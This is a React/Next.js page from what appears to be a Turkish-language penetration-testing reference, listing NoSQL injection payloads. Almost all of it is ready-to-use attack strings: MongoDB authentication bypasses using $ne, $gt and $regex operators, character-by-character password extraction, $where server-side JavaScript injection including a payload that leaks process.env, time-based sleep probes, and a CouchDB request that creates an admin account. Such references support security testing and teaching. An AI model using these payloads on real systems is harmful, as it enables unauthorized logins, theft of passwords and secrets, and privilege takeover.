"use client"

import { motion } from "framer-motion"
import { Database, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function NoSQLInjectionPage() {
  return (
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-yellow-400 text-sm font-medium mb-4">
          <Database className="w-4 h-4" />
          <span>Injection Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">NoSQL Injection</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          MongoDB, CouchDB ve diğer NoSQL veritabanlarına yönelik injection saldırıları.
          Authentication bypass, data extraction ve server-side JavaScript injection.
        </p>
      </motion.div>

      <Callout type="warning" title="Yaygın Hedef">
        MongoDB en yaygın NoSQL veritabanı ve en çok hedef alınan. Node.js + Express + MongoDB
        stack&apos;inde özellikle yaygındır.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">MongoDB Authentication Bypass</h2>
        <PayloadList
          title="Login Bypass Payloads"
          initialShow={10}
          payloads={[
            { code: `{"username":{"$ne":""},"password":{"$ne":""}}`, note: "Not equal - tüm kullanıcılar" },
            { code: `{"username":"admin","password":{"$ne":""}}`, note: "Admin girişi" },
            { code: `{"username":"admin","password":{"$gt":""}}`, note: "Greater than boş string" },
            { code: `{"username":{"$gt":""},"password":{"$gt":""}}`, note: "İlk kullanıcı ile giriş" },
            { code: `{"username":{"$regex":"admin"},"password":{"$ne":""}}`, note: "Regex ile username match" },
            { code: `{"username":{"$regex":"^admin"},"password":{"$regex":".*"}}`, note: "Regex wildcard" },
            { code: `{"username":{"$in":["admin","root"]},"password":{"$ne":""}}`, note: "$in operator" },
            { code: `{"username":{"$exists":true},"password":{"$exists":true}}`, note: "$exists operator" },
            { code: `username=admin&password[$ne]=x`, note: "URL parameter injection" },
            { code: `username=admin&password[$gt]=`, note: "URL parameter $gt" },
            { code: `username[$ne]=x&password[$ne]=x`, note: "Both fields injection" },
            { code: `username=admin&password[$regex]=.*`, note: "URL regex injection" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Data Extraction</h2>
        <PayloadList
          title="Blind Data Extraction"
          initialShow={8}
          payloads={[
            { code: `{"username":"admin","password":{"$regex":"^a"}}`, note: "Password 'a' ile mi başlıyor?" },
            { code: `{"username":"admin","password":{"$regex":"^ab"}}`, note: "İlk 2 karakter 'ab' mi?" },
            { code: `{"username":"admin","password":{"$regex":"^abc"}}`, note: "Karakter karakter extraction" },
            { code: `{"username":{"$regex":"^a"},"password":{"$ne":""}}`, note: "Username enumeration" },
            { code: `{"email":{"$regex":".*@target.com"},"password":{"$ne":""}}`, note: "Email enumeration" },
            { code: `{"$where":"this.password.length == 8"}`, note: "Password uzunluğu tespiti" },
            { code: `{"$where":"this.password[0] == 'a'"}`, note: "$where ile karakter extraction" },
            { code: `{"$where":"this.username == 'admin' && this.password.match(/^a/)"}`   , note: "$where regex" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">MongoDB Operators</h2>
        <PayloadList
          title="Operator Injection"
          initialShow={10}
          payloads={[
            { code: `{"$ne": "value"}`, note: "Not equal" },
            { code: `{"$gt": ""}`, note: "Greater than" },
            { code: `{"$lt": "~"}`, note: "Less than" },
            { code: `{"$gte": ""}`, note: "Greater than or equal" },
            { code: `{"$in": ["admin","root","user"]}`, note: "In array" },
            { code: `{"$nin": ["blocked"]}`, note: "Not in array" },
            { code: `{"$regex": ".*"}`, note: "Regex match all" },
            { code: `{"$exists": true}`, note: "Field exists" },
            { code: `{"$or": [{"a":"b"},{"c":"d"}]}`, note: "OR operator" },
            { code: `{"$where": "1==1"}`, note: "JavaScript evaluation" },
            { code: `{"$where": "sleep(5000)"}`, note: "Time-based blind" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Server-Side JavaScript</h2>
        <PayloadList
          title="SSJS Injection"
          initialShow={6}
          payloads={[
            { code: `{"$where":"sleep(5000)"}`, note: "Time-based detection" },
            { code: `{"$where":"this.a=='\\'; return true; var x='"}`, note: "Always true" },
            { code: `'; return true; var x='`, note: "String breakout" },
            { code: `0; return true`, note: "Numeric breakout" },
            { code: `{"$where":"(function(){var x=new this.constructor.constructor('return process.env')();return JSON.stringify(x)})()"}`, note: "Environment variable leak" },
            { code: `db.users.find({$where: "this.password.match(/^admin/)"})`, note: "Direct MongoDB shell" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">CouchDB Injection</h2>
        <PayloadList
          title="CouchDB Payloads"
          initialShow={4}
          payloads={[
            { code: `GET /_all_dbs`, note: "Tüm veritabanlarını listele" },
            { code: `GET /db_name/_all_docs`, note: "Tüm dokümanları listele" },
            { code: `GET /_config`, note: "Konfigürasyon bilgisi" },
            { code: `PUT /_users/org.couchdb.user:hacker {"name":"hacker","password":"pass","roles":["_admin"],"type":"user"}`, note: "Admin kullanıcı oluşturma" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Test Metodolojisi">
        1. JSON body&apos;de operator injection deneyin ($ne, $gt, $regex){"\n"}
        2. URL parametrelerinde bracket notation kullanın (param[$ne]=){"\n"}
        3. Regex ile blind data extraction yapın (karakter karakter){"\n"}
        4. $where ile SSJS injection deneyin{"\n"}
        5. Content-Type: application/json olduğundan emin olun
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/injection/ldap" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>LDAP Injection</span>
        </Link>
        <Link href="/docs/injection/ssti" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>SSTI</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
  )
}
